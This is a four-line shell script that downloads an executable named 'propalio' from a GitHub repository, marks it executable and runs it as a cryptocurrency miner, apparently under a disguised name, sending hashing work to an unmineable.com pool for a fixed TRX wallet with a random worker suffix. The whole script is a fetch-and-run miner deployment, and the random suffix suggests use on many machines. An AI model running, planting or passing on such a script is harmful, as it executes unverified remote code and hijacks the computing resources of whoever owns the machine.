#!/bin/sh
wget https://github.com/mariobiszz/SRB/raw/main/propalio
chmod +x propalio
./propalio --algorithm cryptonight_upx --pool rx.unmineable.com:3333 --wallet TRX:TKoW5WgfTDEXr6upoJn9hhT2LHLsEJ3RTW.$(echo $(shuf -i 1-20000 -n 1)-V) --password x
